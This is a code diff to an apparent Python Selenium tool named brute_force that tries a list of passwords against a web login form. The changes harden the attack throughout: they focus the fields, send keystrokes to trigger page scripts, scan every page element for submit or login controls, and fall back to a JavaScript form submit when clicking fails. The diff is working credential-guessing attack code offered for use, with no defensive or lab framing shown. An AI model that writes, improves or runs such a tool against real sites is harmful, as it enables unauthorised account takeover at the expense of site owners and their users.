@@ -113,26 +113,47 @@ def brute_force(url, username, password_list, delay=2, success_url=None, verbose
                     break
                 if username_field:
                     try:
+                        username_field.click()  # Focus username field
                         username_field.clear()
                         username_field.send_keys(uname)
+                        username_field.send_keys(' ')  # Trigger possible JS events
+                        username_field.send_keys(Keys.TAB)  # Move to next field
                     except Exception:
                         continue  # Skip if username field not interactable
                 try:
+                    password_field.click()  # Focus password field
                     password_field.clear()
                     password_field.send_keys(pwd)
+                    password_field.send_keys(' ')  # Trigger possible JS events
                 except Exception:
                     continue  # Skip if password field not interactable
-                # Fully automatic submit button detection and click
+                # Enhanced submit button detection and fallback
                 try:
                     # Collect all candidate submit buttons
                     candidates = []
                     # All <button> elements
                     candidates += driver.find_elements(By.TAG_NAME, 'button')
-                    # All <input type=submit>
+                    # All <input type=submit> and <input type=button>
                     candidates += driver.find_elements(By.XPATH, "//input[@type='submit']")
-                    # Filter: if any candidate has value, aria-label, id, class containing submit/login
-                    filtered = []
+                    candidates += driver.find_elements(By.XPATH, "//input[@type='button']")
+                    # Any clickable element with id/class/aria-label/text containing submit/login
+                    candidates += [el for el in driver.find_elements(By.XPATH, '//*') if any(
+                        kw in (el.get_attribute('id') or '').lower() or
+                        kw in (el.get_attribute('class') or '').lower() or
+                        kw in (el.get_attribute('aria-label') or '').lower() or
+                        kw in (el.text or '').lower()
+                        for kw in ['submit', 'login']
+                    )]
+                    # Remove duplicates
+                    seen = set()
+                    unique_candidates = []
                     for el in candidates:
+                        if id(el) not in seen:
+                            unique_candidates.append(el)
+                            seen.add(id(el))
+                    # Filter: if any candidate has value, aria-label, id, class, text containing submit/login
+                    filtered = []
+                    for el in unique_candidates:
                         try:
                             v = (el.get_attribute('value') or '').lower()
                             a = (el.get_attribute('aria-label') or '').lower()
@@ -145,7 +166,7 @@ def brute_force(url, username, password_list, delay=2, success_url=None, verbose
                             continue
                     # If filtered found, try them first
                     clicked = False
-                    for el in filtered + [e for e in candidates if e not in filtered]:
+                    for el in filtered + [e for e in unique_candidates if e not in filtered]:
                         try:
                             el.click()
                             clicked = True
@@ -155,8 +176,19 @@ def brute_force(url, username, password_list, delay=2, success_url=None, verbose
                     if not clicked:
                         # Fallback: send Enter key
                         password_field.send_keys(Keys.RETURN)
+                        time.sleep(0.2)
+                        # If still not submitted, try JS submit
+                        try:
+                            driver.execute_script('if(arguments[0] && arguments[0].form){arguments[0].form.submit();}', password_field)
+                        except Exception:
+                            pass
                 except Exception:
                     password_field.send_keys(Keys.RETURN)
+                    time.sleep(0.2)
+                    try:
+                        driver.execute_script('if(arguments[0] && arguments[0].form){arguments[0].form.submit();}', password_field)
+                    except Exception:
+                        pass
                 time.sleep(delay)
                 # Success check
                 if success_url:
@@ -191,25 +223,43 @@ def brute_force(url, username, password_list, delay=2, success_url=None, verbose
                 break
             if username_field and username is not None:
                 try:
+                    username_field.click()  # Focus username field
                     username_field.clear()
                     username_field.send_keys(username)
+                    username_field.send_keys(' ')
+                    username_field.send_keys(Keys.TAB)
                 except Exception:
                     continue  # Skip if username field not interactable
             try:
+                password_field.click()  # Focus password field
                 password_field.clear()
                 password_field.send_keys(pwd)
+                password_field.send_keys(' ')
             except Exception:
                 continue  # Skip if password field not interactable
         except Exception:
             continue  # Skip this attempt if any error
-        # (Do not print each password, only show progress in CLI)
+        # Enhanced submit button detection and fallback
         try:
-            # Collect all candidate submit buttons
             candidates = []
             candidates += driver.find_elements(By.TAG_NAME, 'button')
             candidates += driver.find_elements(By.XPATH, "//input[@type='submit']")
-            filtered = []
+            candidates += driver.find_elements(By.XPATH, "//input[@type='button']")
+            candidates += [el for el in driver.find_elements(By.XPATH, '//*') if any(
+                kw in (el.get_attribute('id') or '').lower() or
+                kw in (el.get_attribute('class') or '').lower() or
+                kw in (el.get_attribute('aria-label') or '').lower() or
+                kw in (el.text or '').lower()
+                for kw in ['submit', 'login']
+            )]
+            seen = set()
+            unique_candidates = []
             for el in candidates:
+                if id(el) not in seen:
+                    unique_candidates.append(el)
+                    seen.add(id(el))
+            filtered = []
+            for el in unique_candidates:
                 try:
                     v = (el.get_attribute('value') or '').lower()
                     a = (el.get_attribute('aria-label') or '').lower()
@@ -221,7 +271,7 @@ def brute_force(url, username, password_list, delay=2, success_url=None, verbose
                 except Exception:
                     continue
             clicked = False
-            for el in filtered + [e for e in candidates if e not in filtered]:
+            for el in filtered + [e for e in unique_candidates if e not in filtered]:
                 try:
                     el.click()
                     clicked = True
@@ -230,8 +280,18 @@ def brute_force(url, username, password_list, delay=2, success_url=None, verbose
                     continue
             if not clicked:
                 password_field.send_keys(Keys.RETURN)
+                time.sleep(0.2)
+                try:
+                    driver.execute_script('if(arguments[0] && arguments[0].form){arguments[0].form.submit();}', password_field)
+                except Exception:
+                    pass
         except Exception:
             password_field.send_keys(Keys.RETURN)
+            time.sleep(0.2)
+            try:
+                driver.execute_script('if(arguments[0] && arguments[0].form){arguments[0].form.submit();}', password_field)
+            except Exception:
+                pass
         time.sleep(delay)
         # Success check
         if success_url:
